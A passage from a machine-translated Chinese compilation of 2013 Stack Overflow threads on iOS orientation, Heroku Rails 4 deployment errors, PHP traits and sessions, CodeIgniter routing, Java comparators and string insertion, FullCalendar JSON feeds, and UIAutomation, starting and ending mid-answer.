我移动`bottomfadebar`到内容内部，将内容的高度更改为 100% 并将其更改`bottomfadebar`为绝对

[http://jsfiddle.net/EzuTT/1/](http://jsfiddle.net/EzuTT/1/) - 这就是你要找的吗？

# ios - 仅设置键盘方向 (iOS 6)

> ID：15443452
> 
> 赞同：2
> 
> 时间：2013-03-15T23:02:42.653
> 
> 标签：ios, ios6

在我尝试使用 ios 6 SDK 进行一些更改之前，我的应用程序一直运行良好

该应用程序 99% 的时间都以纵向模式运行。这受到了仅允许在 info.plist 中使用肖像模式的限制

有一个视图控制器需要以横向模式显示。这是通过简单地将视图旋转 90 度来“手动”实现的，如下所示：

```
self.view.transform = CGAffineTransformMakeRotation(3.14159/2); 
```

这在 iOS 6 中仍然可以正常工作。

然而，这个视图控制器有一些文本字段。当用户点击一个时，它会显示键盘。因为我只旋转了视图（*实际上*并没有改变设备的方向），所以键盘以纵向模式出现，这不好。

在以前的 iOS 版本中，我将状态栏的方向设置为横向，作为副产品，这会将键盘也设置为横向，如下所示：

```
[[UIApplication sharedApplication] setStatusBarOrientation: UIInterfaceOrientationLandscapeRight animated:NO]; 
```

但是，这已停止适用于 iOS 6。

我已经阅读了一百万个堆栈溢出，试图让它工作，但仍然没有运气。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:21:04.800

更改键盘方向和转换是一个困难的部分，而不是一个好的解决方案（尤其是当它改变状态栏方向时）。

更好的解决方案是允许应用程序支持所有方向。

![在此处输入图像描述](../Images/a44e03803a7482035a87edea4100676c.png)

根据旋转支持在 ViewControllers 中实现方向委托。

**仅支持横向**

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return interfaceOrientation == UIInterfaceOrientationLandscapeLeft
    || interfaceOrientation == UIInterfaceOrientationLandscapeRight ;
}

- (BOOL)shouldAutorotate
{
    return NO;
} 
```

**仅支持纵向**

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

- (BOOL)shouldAutorotate
{
    return NO;
}

- (NSUInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskPortrait;
} 
```

# c# - 微软互操作 Excel。Windows Server 2003 的 COM 异常

> ID：15443453
> 
> 赞同：0
> 
> 时间：2013-03-15T23:02:45.247
> 
> 标签：c#, .net, com, windows-server-2003, excel-interop

我在未安装 Microsoft Office 的 Windows Server 2003 上部署了 VS.Net 2003 Web 应用程序。除 Excel 报告功能外，一切正常。在我有 MS office 的开发 PC 中很好。例外是：

> CLSID 为 {00024500-0000-0000-C000-000000000046} 的 COM 对象无效或未注册。

有没有办法在服务器上不安装 MS Office 的情况下解决此错误？任何 Office 运行时组件来解决此问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:05:42.687

不，COM 互操作直接与 Excel 的组件交互。我所知道的唯一运行时组件是允许您使用已安装的 Excel 副本的 Interop 组件。

# windows-7 - windows heroku 运行 rake db:migrate 错误“/usr/bin/env: ruby .exe: 没有这样的文件或目录”

> ID：15443456
> 
> 赞同：9
> 
> 时间：2013-03-15T23:03:19.037
> 
> 标签：windows-7, heroku, ruby-on-rails-4

我在这里对 Rails 很陌生，并且大部分内容我都遵循[了 Ruby on Rails 教程](http://ruby.railstutorial.org/ruby-on-rails-tutorial-book)。从那以后，我决定制作自己的应用程序，但使用的是测试版的 Rails 4 gem。我已经在我的本地机器（Windows 7）上安装了 PostgreSQL 并完成了开发。一切都很好！（我对 Rails 的热爱远胜于我赖以谋生的 C#、ASP、.NET 工作！）

然而，一旦我决定推到 Heroku，我就一直在拔头发。在推送到 Heroku 之前，我做了以下标准：

```
c:\Sites\elms>git add .
c:\Sites\elms>git commit -m "My comment"
c:\Sites\elms>git push
c:\Sites\elms>git push heroku master 
```

我已经下载并安装了 Heroku Toolbelt（不是`heroku`gem。）第一个错误告诉我我需要确保我`Gemfile`指定的 Ruby >= 1.9.3，所以我在我的顶部添加了“ruby 1.9.3” `Gemfile`：

```
source 'https://rubygems.org'
ruby "1.9.3"

gem 'rails', '4.0.0.beta1'

gem 'pg'
gem 'haml-rails'
gem 'httparty'
gem 'devise', git: 'git://github.com/plataformatec/devise.git', branch: 'rails4'
gem 'cancan'
gem 'bootstrap-sass'
gem 'formtastic'
gem 'formtastic-plus-bootstrap'

group :development do
  gem 'annotate'
  gem 'better_errors'
  gem 'binding_of_caller'
  gem 'guard-spork'
  gem 'guard-rspec'
  gem 'meta_request'
  gem 'rb-notifu'
  gem 'schema_to_scaffold'
  gem 'wdm', :platforms => [:mswin, :mingw], :require => false
  gem 'win32console'
end

group :development, :test do
  gem 'rspec-rails'
  gem 'pry'
  gem 'spork-rails', git: 'git://github.com/sahilm/spork-rails.git', branch: 'rails-4'
  gem 'spork', '~> 1.0.0rc3'
end

group :test do
  gem 'capybara'
  gem 'factory_girl_rails'
  gem "shoulda-matchers"
end

group :assets do
  gem 'sass-rails',   '~> 4.0.0.beta1'
  gem 'coffee-rails', '~> 4.0.0.beta1'
  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails'    
gem 'turbolinks'
gem 'jbuilder', '~> 1.0.1' 
```

推送最终没有任何问题，但是当我尝试迁移数据库时，我得到了以下信息：

```
c:\Sites\elms>heroku run rake db:migrate
Running `rake db:migrate` attached to terminal... up, run.2205
/usr/bin/env: ruby.exe: No such file or directory 
```

我也试过: `heroku run bin/rake db:migrate`，它给出了同样的错误。我[在 Heroku 上使用 Rails 4.x 入门](https://devcenter.heroku.com/articles/rails4)将我的 Rails 4 应用程序推送到 Heroku。任何帮助将不胜感激！

哦，我运行后也遇到了问题：

```
c:\Sites\elmx>gem install rails --pre 
```

我通过在 Windows 7 中添加`C:\RailsInstaller\Ruby1.9.3\lib\ruby\gems\1.9.1\bin;`到我的环境路径变量来解决这个问题（它给了我一个错误，它在尝试执行任何东西时找不到轨道，例如：

```
rails -v
rails g controller User 
```

但如果我只输入：

```
rails 
```

它会给我所有可以使用的命令（就像运行一样`rails -h`）

我使用 Windows Rails 安装程序设置我的机器，然后安装 Rails 4 gem。这非常令人沮丧，我已经在互联网上搜索了试图找到有同样问题的人。

编辑1：

我刚刚删除了我的用户路径环境变量并将我的系统路径环境变量修改为如下所示：

```
 C:\RailsInstaller\Ruby1.9.3\bin;C:\RailsInstaller\Ruby1.9.3\lib\ruby\gems\1.9.1\bin;C:\Program Files (x86)\git\cmd;C:\Program Files (x86)\Heroku\bin 
```

将我的路径变量更新为上述并卸载 Heroku Toolbelt，然后重新安装它（因此 Heroku 部分位于路径变量中）并尝试了以下操作：

```
c:\Sites\elms>ruby -v
ruby 1.9.3p125 (2012-02-16) [i386-mingw32]

c:\Sites\elms>rails -v
Rails 4.0.0.beta1

c:\Sites\elms>heroku -v
 !    `-v` is not a heroku command.
 !    Perhaps you meant `-h`.
 !    See `heroku help` for a list of available commands.

c:\Sites\elms>heroku run rake db:migrate
Running `rake db:migrate` attached to terminal... up, run.2100
/usr/bin/env: ruby.exe: No such file or directory

c:\Sites\elms>heroku run bin/rake db:migrate
Running `bin/rake db:migrate` attached to terminal... up, run.2872
/usr/bin/env: ruby.exe: No such file or directory 
```

编辑2：

所以我在这次冒险中走得更远。我发现我可以执行：

```
c:\Sites\elms>heroku run bash
~ $ cd bin
~/bin $ ruby rake db:migrate 
```

然后运行 ​​rake 并在 Heroku 上迁移我的数据库。但问题越来越严重！我尝试导航到该页面，它告诉我有问题，所以我运行日志文件，这就是我得到的：

```
c:\Sites\elms>heroku logs
2013-03-16T05:34:20+00:00 heroku[api]: Enable Logplex by
2013-03-16T05:34:20+00:00 heroku[api]: Release v2 created by 
2013-03-16T05:34:36+00:00 heroku[slugc]: Slug compilation started
2013-03-16T05:35:37+00:00 heroku[web.1]: Starting process with command `bin/rails server -p 13423 -e $RAILS_ENV`
2013-03-16T05:35:37+00:00 heroku[slugc]: Slug compilation finished
2013-03-16T05:35:37+00:00 app[web.1]: bash: bin/rails: No such file or directory

2013-03-16T05:35:39+00:00 heroku[web.1]: Process exited with status 127
2013-03-16T05:35:39+00:00 heroku[web.1]: Starting process with command `bin/rails server -p 33539 -e $RAILS_ENV`
2013-03-16T05:35:40+00:00 app[web.1]: /usr/bin/env: ruby.exe: No such file or directory
2013-03-16T05:35:41+00:00 heroku[web.1]: Process exited with status 127
2013-03-16T05:35:41+00:00 heroku[web.1]: State changed from starting to crashed
2013-03-16T05:35:41+00:00 heroku[web.1]: State changed from crashed to starting
2013-03-16T05:35:44+00:00 heroku[web.1]: Starting process with command `bin/rails server -p 23452 -e $RAILS_ENV`
2013-03-16T05:35:44+00:00 app[web.1]: /usr/bin/env: ruby.exe: No such file or directory 
```

这真是令人沮丧。我不知道到底`/usr/bin/env`是什么。我唯一能猜到的是它就像`PATH`Windows 一样。如果是这样，为什么服务器不知道在哪里`ruby.exe`？

我确实制作了一个非 Rails 4 应用程序，并且能够将其发布到 Heroku 并毫无问题地查看它。这真的让我很紧张。

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2013-04-28T21:36:58.440

您需要在应用程序中更改 3 个文件的第一行：

```
bin/bundle
bin/rails
bin/rake 
```

反而

```
#!/usr/bin/env ruby.exe 
```

一定是

```
#!/usr/bin/env ruby 
```

这就是错误的原因：

```
/usr/bin/env: ruby.exe: No such file or directory 
```

然后你就成功了：

```
heroku run rake db:migrate 
```

这对我有用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-23T15:04:48.750

我遇到了类似的问题，正如其他人已经说过的那样，更改以下内容有所帮助。

`#!/usr/bin/env ruby.exe`至`#!/usr/bin/env ruby`

**但是**，我还需要删除最初在 Windows 上开发时仍然存在的一些隐藏的回车符（我猜？）。

我曾经`dos2unix`这样做过。

```
dos2unix bin/bundle bin/rake bin/rails 
```

在那之后，我提交了我的更改，推送到heroku，一切都很好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-15T17:09:00.827

我遇到了同样的问题，如上所述将三个文件中的ruby.exe更改为ruby，执行

```
 git push heroku master 
```

步骤，它告诉我一切都是最新的。尝试

```
 heroku run rake db:migrate 
```

再走一步，还是不行；关于ruby.exe没有这样的文件或目录，我得到了同样的错误。我按照指示检查了我的 gemfile.lock，但没有看到任何看起来像 windows-y 的东西。

然后我执行了这些：

```
 git add .
    git commit -m "My comment" 
```

并再次尝试

```
 git push heroku master 
```

这一次，大量消息通过，包括：

```
 Removing `Gemfile.lock` because it was generated on Windows. 
```

所以也许它有问题，我只是不知道我应该在其中寻找什么。

再次尝试

```
 heroku run rake db:migrate 
```

看起来很有效，因为我得到了

```
 Running `rake db:migrate` attached to terminal... up, run.3260
    ==  CreateUsers: migrating ====================================================
    -- create_table(:users)
       -> 0.0409s
    ==  CreateUsers: migrated (0.0412s) =========================================== 
```

我最好的猜测是，从 bundle、rake 和 rails 中删除 .exe 的更改实际上并没有在第一次尝试 git push heroku master 和 git add 时被推上去。并且 git commit -m "My comment" 是必要的，以使其被推高。这是我第一次尝试使用 git/heroku/ruby，所以我不知道为什么需要其他两个命令，但请把我的经验记录在这里，以防它帮助其他人。
非常感谢上面的线索，是这三个文件中的 .exe 导致了问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-07-22T08:54:12.893

```
bin/bundle
bin/rails
bin/rake 
```

反而

```
#!/usr/bin/env ruby.exe 
```

一定是

```
#!/usr/bin/env ruby 
```

（感谢之前的帖子）

确保 gemfile.lock 中没有对 windows 的引用——它们可以被删除

然后

```
git push heroku master 
```

如果还有问题使用

heroku 日志（将文本复制到文本编辑器可以更轻松地剪切和粘贴解决方案）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-04-11T07:39:17.667

尝试这个：

```
sudo apt-get install build-essential patch ruby-dev zlib1g-dev liblzma-dev 
```

然后安装 Nokogiri：

```
gem install nokogiri 
```

# php - PHP 5.4 - 特征和自我/静态

> ID：15443458
> 
> 赞同：13
> 
> 时间：2013-03-15T23:03:38.760
> 
> 标签：php, static, constructor, traits

我想在我的类上链接方法调用，如下所示：

```
new Obj($args, $if, $any)->foo()->bar(); 
```

不幸的是，我必须将结构括在括号内：

```
(new Obj($args, $if, $any))->foo()->bar(); 
```

因此，我希望有一个可以在每个班级中重复使用的特质，我希望能够执行以下操作：

```
Obj::create($args, $if, $any)->foo()->bar(); 
```

我希望它成为一个特征，这样我的类仍然可以从其他类继承。我已经到了这一点：

```
trait Create
{
    public static final function create()
    {
        $reflect = new ReflectionClass(/* self ? static ? Anything else ? */);
        return $reflect->newInstanceArgs(func_get_args());
    }
}

class Obj
{
    use Create;

    // ...
} 
```

但似乎特征不处理 self 或 static 关键字，我不能这样做，`get_class($this)`因为这是静态的。请问有什么明确的方法可以做我想做的事吗？

谢谢阅读。

编辑：对于那些想知道的人，这就是为什么我希望它成为一个特征而不是抽象基类：

```
$database = (new Database())
    ->addTable((new Table())
        ->addColumn((new Column('id', 'int'))
            ->setAttribute('primary', true)
            ->setAttribute('unsigned', true)
            ->setAttribute('auto_increment', true))
        ->addColumn(new Column('login', 'varchar'))
        ->addColumn(new Column('password', 'varchar')));

$database = Database::create()
    ->addTable(Table::create()
        ->addColumn(Column::create('id', 'int')
            ->setAttribute('primary', true)
            ->setAttribute('unsigned', true)
            ->setAttribute('auto_increment', true))
        ->addColumn(Column::create('login', 'varchar'))
        ->addColumn(Column::create('password', 'varchar'))); 
```

更少的括号深度，更少的错误和修复这些错误所需的时间更少，加上更易于阅读的代码，并且在我看来，更好的代码。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-15T23:05:48.580

是的，有[**`get_called_class()`**](http://php.net/get_called_class)，这正是你想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:15:37.210

我不明白你为什么不想使用括号——它并不是世界上最糟糕的语法（事实上，我认为从视觉角度来看，它比你想要替换它的双冒号语法更好和）

但是，如果您确实想在所有类上都有这样的工厂方法，为什么不创建一个基类，所有其他类都从该基类扩展定义该`create`方法呢？我不认为你需要一个特质。

```
class BaseClass {
    public function create() {
        ...
    }
} 
```

然后`extends BaseClass`是你还没有的所有其他课程`extends`。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2014-07-19T16:24:50.040

**Traits**是 PHP 中的一个新特性。此功能在 5.4 版本中引入。这是 PHP 中多重继承的替代品

**例子：**

```
trait Net
{
    public function net()
    {
        return 'Net';
    }
}

trait Tuts
{
    public function tuts()
    {
        return 'Tuts';
    }
}

class NetTuts
{
    use Net, Tuts;
    public function plus()
    {
        return 'Plus';
    }
}

$o = new NetTuts;
echo $o->net(), $o->tuts(), $o->plus(); 
```

输出是：NetTutsPlus

```
echo (new NetTuts)->net(), (new NetTuts)->tuts(), (new NetTuts)->plus(); 
```

输出是：NetTutsPlus

在对象 $o 的帮助下，我们可以访问**特征**函数值..

# database - 较慢的 CodeIgniter 加载时间：基类

> ID：15443460
> 
> 赞同：0
> 
> 时间：2013-03-15T23:04:03.113
> 
> 标签：database, codeigniter, caching, routes

我正在为我的 codeigniter 应用程序创建一个数据库驱动的路由。问题是，如果我的表中有超过 X 几十行，我的应用程序运行速度非常慢！问题是我没有使用或从我创建的路由表中获取任何信息。

事实上，我在我的应用程序的缓存文件夹中使用路由文件。

所以这是我没有缓存文件和数据库为空的：

![在此处输入图像描述](../Images/cfe05aac99f14a20ad6c4c696e7ee561.png)

0.0071 / 0,0196 / 0.0268

这是我的 20.000 行和缓存文件的内容：（缓存文件为 20.000 行）

![在此处输入图像描述](../Images/9a824119ee10554bcbf1166f537a4552.png)

0.2637 / 0,0114 / 0.2752

这是我对空数据库和缓存文件的看法：（缓存文件为 20.000 行）

![在此处输入图像描述](../Images/b411789de80ac0dd893ebb43652d605a.png)

0.0036 / 0.0142 / 0.0179

所以，我不知道为什么我在这三个基准之间有这么大的差异！

有没有办法缓存数据库或对此做些什么？

如果有人可以帮助我，请提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T09:43:47.330

在我的第一个案例中，我使用的是这样的 Hooks：

require_once APPPATH."config/database.php";

```
$hook['pre_system'] = array(
     'class'    => 'Router_Hook',
     'function' => 'get_routes',
     'filename' => 'Router_Hook.php',
     'filepath' => 'hooks',
     'params'   => array($db['default']['hostname'],$db['default']['username'],$db['default']['password'],$db['default']['database'],$db['default']['dbprefix'],)
                        ); 
```

在我的 router_hook 文件中，我有：

```
function get_routes($params)
{
    global $DB_ROUTES;

    mysql_connect($params[0], $params[1], $params[2]);

    mysql_select_db($params[3]);

    $sql = "SELECT * FROM {$params[4]}routes";
    $query = mysql_query($sql);

    $routes = array();
    while ($route = mysql_fetch_array($query, MYSQL_ASSOC)) {
        $routes[$route['route']] = $route['controller'];
    }
    mysql_free_result($query);
    mysql_close();
    $DB_ROUTES = $routes;
} 
```

我的路由中包含 config/routes.php 中的全局变量

现在我将它更改为缓存文件夹中的缓存版本 => cache/routes.php 并将其包含在我的 config/routes.php

所以我不再需要我的钩子了 => 性能提升！

# java - 与 Java 中的参数相当

> ID：15443464
> 
> 赞同：2
> 
> 时间：2013-03-15T23:04:56.100
> 
> 标签：java, comparator, comparable

我有一个带有签名的类 PriorityList

```
树<Key extends Comparable<Key>, Value>
```

（这是给定的，我无法修改）。元素`Tree`以某种顺序插入，给定键（即它考虑键的`compareTo`方法）。

假设我有`Tree<Integer, Integer>`. 整数的默认`compareTo`值考虑升序。如果我愿意，我希望能够以某种方式`Tree`按降序插入元素。我知道我可能可以编写另一个`MyInteger`实现`Comparable`并拥有`compareTo`自己的类。

但是还有其他方法吗？我真正想要的是能够以某种方式告诉`Tree`如何对值进行排序。

第二个问题：如果我能够修改`Tree`，如何将比较器作为参数传递？（牢记泛型类型语法）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:10:18.460

您已经命名了两种方法：传入比较器或让键可比较。如果该类不允许您传入自己的比较器，那么您将被困在使用键或使用 Comparable 接口创建自己的子类

替代代码看起来像这样。

```
public class Tree<K,V>{
   public Tree( Comparator<K> cmp ) {...}

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:18:14.343

您不需要为反向创建一个新类。您可以使用[Collections.reverseOrder()](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html#reverseOrder%28java.util.Comparator%29)来获得`Comparator`与给定相反的结果。

至于第二个问题，您只需在树中添加一个 setter。类似于： `setComparator(Comparator<Key> c)`然后使用该比较器进行`Tree`.

# php - $_SESSION 变量用于检查表单是否已提交

> ID：15443468
> 
> 赞同：0
> 
> 时间：2013-03-15T23:05:10.140
> 
> 标签：php, html, post, session-variables

我有一个名为“index.php”的登录页面，格式如下：

```
<form action="auto_mail.php" method="post">
   <input id="signup" class="span8" type="text" placeholder="Your email" name="signup">
   <input type="submit">
   <?php
     if (isset($_SESSION['got_it']))
     {echo "<b>You're all signed up!</b>}
   ?></form> 
```

在`auto_mail.php`我的文件中：

```
// code scrubbing user input...
$user_email = $_POST['signup'];
session_start();
$_SESSION['got_it'] = '1';
// code sending me an email when someone signs up.
echo <<<EOD
  </b>
  <meta http-equiv="refresh" content="0, url=index.php">
  </div>
  </body>
  </html>
EOD;
?> 
```

我查看了其他一些 SO 问题（[使用 $_SESSION 携带数据](https://stackoverflow.com/questions/7924338/using-session-to-carry-data)），但这不是我想要的。

我想要的只是让用户在输入有效电子邮件时看到“你们都已注册”；在后台发送电子邮件确认电子邮件。这段代码感觉笨拙和尴尬。它还会短暂地闪烁`auto_mail.php`页面。

我尝试设置`<form action="index.php"...`，但它不起作用，因为我已经设置`auto_mail.php`，您无法直接访问它。

如何使用中的代码`auto_mail.php`检查有效的电子邮件地址并发送确认电子邮件，而不同时处理`$_POST`和`$_SESSION`，或者至少更好地使用它们？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-15T23:08:22.523

如果您不想重新加载任何页面，则必须使用 AJAX 发送表单，而不是使用表单`POST`。

如果您使用 jQuery 或 Mootools，它们都内置了包装器来处理 ajax 调用。如果没有帮助程序库，您将不得不考虑自己创建[XMLHttpRequest](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest)。

除此之外，传统上，您会将用户重定向到“提交的表单”页面，或者*将*表单`action`发送到同一页面（在您的情况下，`index.php`如果收到表单数据，则使用 PHP 代码处理表单数据） .

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:15:08.690

我没有完全得到你想要的。

我认为您尝试验证已发送该表格的邮件地址（之后？）。但是您无法通过进行验证的 http 访问该文件。

您是否考虑过包含 auto_mail.php？

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-03-15T23:14:34.700

我认为您应该考虑使用流行的 PHP 框架之一。我猜你在上面的例子中没有使用任何东西。还提供 MVC 结构的良好框架允许以您甚至无法想象的简单方式进行这样的操作。

将其分解为 MVC 结构甚至可以使`post`在一个操作中处理发送和显示依赖关系和结果变得非常简单。一开始学习好的框架可能看起来是在浪费时间，但相信我——它会很快得到回报。

首先，我建议你看一下，`Kohana Framework`或者，如果你有野心的话 - `Symfony Framework`。

# fullcalendar - 带有 JSON 提要的完整日历以扩展形式返回 eventSource

> ID：15443472
> 
> 赞同：1
> 
> 时间：2013-03-15T23:05:38.447
> 
> 标签：fullcalendar, angular-ui

我正在使用带有 Angular UI 的 arshaw 出色的 fullcalendar，现在我遇到扩展形式的 eventSource 对象在作为 JSON 提要获取时无法呈现的问题。

使用控制器中的以下代码获取数据：

```
$scope.events = [   
  '/api/v1/users/104/events?format=cal&type=9',
  '/api/v1/users/104/events?format=cal&type=10'
];
$scope.eventSources = $scope.events; 
```

当 JSON 提要返回一个包含事件对象的数组时，它实际上可以工作：

```
// returned by - /api/v1/users/104/events?format=cal&type=9
[
  {
    url: "/#/events/86893",
    start: "2013-03-15",
    title: ": Event - 86893"
  },
  {
    url: "/#/events/31348",
    start: "2013-03-27T09:30Z",
    title: "Event - 31348"
  }
],
// returned by - /api/v1/users/104/events?format=cal&type=10
[
  {
    url: "/#/events/86899",
    start: "2013-03-25",
    title: ": Event - 86899"
  },
  {
    url: "/#/events/31349",
    start: "2013-03-17T09:30Z",
    title: "Event - 31349"
  }
] 
```

但是，我想指定一些选项以及事件数据，例如不同 JSON 提要的不同颜色。[因此，我决定让 API 以其扩展形式](http://arshaw.com/fullcalendar/docs/event_data/Event_Source_Object/)返回事件源。这就是它 API 返回的内容。

```
// returned by - /api/v1/users/104/events?format=cal&type=9
{
  events: [
    {
      url: "/#/events/86893",
      start: "2013-03-15",
      title: "Event - 86893"
    },
    {
      url: "/#/events/31348",
      start: "2013-03-27T09:30Z",
      title: "Event - 31348"
    }
  ],
  color: "#ff9900",
  allDayDefault: false,
  ignoreTimezone: true
},
// returned by - /api/v1/users/104/events?format=cal&type=10
{
  events: [
    {
      url: "/#/events/86899",
      start: "2013-03-25",
      title: "Event - 86899"
    },
    {
      url: "/#/events/31349",
      start: "2013-03-17T09:30Z",
      title: "Event - 31349"
    }
  ],
  color: "#3366FF",
  allDayDefault: false,
  ignoreTimezone: true
} 
```

不幸的是，这种格式在以 JSON 格式获取时不会呈现。在获取扩展格式时，我将 eventSources 分配更改为如下所示：

```
$scope.eventSources = [ $scope.events ]; 
```

如果我将 API 中的原始 JSON 响应（事件源的扩展形式）直接剪切并粘贴到 eventSources 方法中，它就可以工作。当事件源作为 JSON 提要返回时，是否可以使用扩展形式的事件源？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T07:09:00.843

会不会是从 API 返回的 eventSource 不是应该使用扩展表单选项的地方，而是在用作 eventSource 的事件函数中。

该文档指出，扩展形式应在用于调用 API 的 Json 对象内部使用。

[http://arshaw.com/fullcalendar/docs/event_data/events_json_feed/](http://arshaw.com/fullcalendar/docs/event_data/events_json_feed/)

如果 API 过于返回事件的额外选项，则需要单独设置每个选项。

目前在这篇文章中，我看到调用扩展选项的唯一地方是返回的 api 数据。

我认为这应该反过来。日历甚至在请求数据之前就应该知道扩展表单。这意味着服务器不需要返回任何额外的选项，日历将按提要和扩展选项组织事件对象。

如果您可以发布一个 plunk，那么我们可以解决这个问题。

# java - 将一个字符串放入另一个字符串java

> ID：15443479
> 
> 赞同：1
> 
> 时间：2013-03-15T23:06:22.540
> 
> 标签：java, string, performance, algorithm, insert

我试图将一根弦插入另一根弦的中间，然后放入`Monkey`新弦的中间。

```
String One = "MonkeyPony";
String Two = "Monkey"; 
```

基本上我想要做的是插入`"Monkey"`到无数次的中间`"MonkeyPony"`，所以第一次它会`"MonkeMonkeyyPony"`在第二次读取`"MonkeMonMonkeykeyyPony"`，等等。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T23:21:37.973

使用 StringBuilder：

```
StringBuilder builder = new StringBuilder(One);
for (int i = 0; i < 10; ++i) {
  builder.insert(builder.length() / 2, Two);
  System.out.println(builder.toString());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T20:04:34.087

这个解决方案可能很简单，但是与其他解决方案相比，它会消耗大量时间。
[**这里使用了substring**](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html)方法。

```
import java.util.Scanner;

public class test {

     public static void main(String[] args) {

         int n=0;
         String str1,str2=null;

         Scanner in = new Scanner(System.in);

         System.out.println("Enter the String1.!");
         str1=in.nextLine();

         System.out.println("Enter the String2.!");
         str2=in.nextLine();

         System.out.println("Enter the Count.!"); 
         n=Integer.parseInt(in.nextLine());

         in.close();

         for(int i=0;i<n;i++)
         {
             //Concept: Say str1=TEST str2=123, Now the below code will do this TE + 123 + ST 
             str1=str1.substring(0,str1.length()/2) + str2 + str1.substring(str1.length()/2);
             System.out.println(str1);
         }

        }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:43:09.170

我不知道这个问题是来自你的实际工作还是家庭作业/面试算法问题。

直接的解决方案是计算原始字符串的索引，将新字符串插入该位置。这样做 n 次。

我只是写一个想法，不确定是否可以：说我们想做插入100（n）次

*   首先我们取字符串二，`Monkey`
*   构建两个字符串，一个`"Mon"`重复 99 次 (n-1)，另一个是`"key"`，也重复 99 次
*   找出字符串 ONE 的插入索引，比如说`i`
*   将此字符串插入到`i`位置：`99Mons + String TWO("Monkey") + 99keys`

我不确定这是否是一个好方法......

* * *

## 做了一个小测试：

我对我的解决方案的性能很好奇，所以我用@Ame Burmeister 的简单解决方案做了一个小的性能测试。

在我的测试中：

*   测试完成`Junit Test class`
*   `StopWatch`来自番石榴
*   `warming up`测量经过时间前 4 次，以避免`Jit`
*   这两种方法给出相同的输出（n 更小），都正确实现。
*   两者都使用`100000`插入测试

### 直接的解决方案（基本上只是从@Ame's answer复制）

```
@Test
    public void insertWithBuilder() {
        final int n = 100000;
        final String one = "MonkeyPony";
        final String two = "Monkey";

        final Stopwatch sw = new Stopwatch();
        int x = 1;
        for (; x <= 5; x++) {// loop 4 times (warming up) to avoid JIT
            if (x == 5) {
                sw.start();
            }
            final StringBuilder builder = new StringBuilder(one);
            System.out.println("warming up times:" + x);
            for (int i = 0; i < n; ++i) {
                builder.insert(builder.length() / 2, two);
            }
            if (x == 5) {
                sw.stop();
                // System.out.println("builder:" + builder.toString());
            }
        }
        System.out.println("SBuilder:" + sw.elapsedTime(TimeUnit.MILLISECONDS));
    } 
```

### 我的想法的实现：

```
@Test
    public void insertWithRepeatString() {
        final int n = 100000;
        final String one = "MonkeyPony";
        final String two = "Monkey";

        final Stopwatch sw = new Stopwatch();
        int x = 1;
        for (; x <= 5; x++) { // loop 4 times (warming up) to avoid JIT
            System.out.println("warming up times:" + x);
            if (x == 5) {
                sw.start();
            }
            final StringBuilder builder = new StringBuilder(one);
            final int m = two.length() / 2;
            final String h1 = two.substring(0, m); //get Mon
            final String r1 = two.substring(m);    //get Key
            final String head = new String(new char[n - 1]).replace("\0", h1); //build repeat string
            final String tail = new String(new char[n - 1]).replace("\0", r1); //build repeat String
            final StringBuilder builder2 = new StringBuilder(head);
            builder2.append(two).append(tail);
            builder.insert(builder.length() / 2, builder2);
            if (x == 5) {
                sw.stop();
                // System.out.println("builder:" + builder.toString());
            }
        }
        System.out.println("Idea:" + sw.elapsedTime(TimeUnit.MILLISECONDS));
    } 
```

### 输出：

```
warming up times:1
warming up times:2
warming up times:3
warming up times:4
warming up times:5
Idea:41
warming up times:1
warming up times:2
warming up times:3
warming up times:4
warming up times:5
SBuilder:4413 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:12:19.040

你可以试试这个：

```
One = One.substr(0,One.length()/2)+Two+One.substr(One.length()/2+1, One.length(); 
```

字符串连接中的第一个元素取字符串 One 的前半部分，然后用单词 Two 连接，然后添加其余部分。

# iphone - 设备上的 UIAutomation 在开始捕获时挂起

> ID：15443481
> 
> 赞同：11
> 
> 时间：2013-03-15T23:06:26.973
> 
> 标签：iphone, xcode, instruments, ui-automation

当我尝试使用 UIAutomation 在设备上捕获 UI 输入时，它挂起并显示“正在启动捕获”。

```
1) I click on Profile in Xcode which
2) Starts up Instruments where I select Automation and click Profile
3) Which starts Instruments running.  In Scripts I select Add->Create which shows the record button at the bottom 
4) I click the record button and it hangs saying "Starting Capture" and doesn't record my UI input. 
```

我的配置文件方案的构建配置是调试。

知道我缺少什么导致 UIAutomation 挂起吗？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2014-10-31T18:18:51.493

对于 iOS8 设备，还要确保在“设置”中启用了 UI 自动化。

设置 -> 开发人员 -> 启用 UI 自动化

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-03-16T00:05:26.867

弄清楚了。我希望这对其他人有帮助！

```
1)  Click on Profile in Xcode (or Cmd-I)
2)  In Instruments select Automation and click Profile
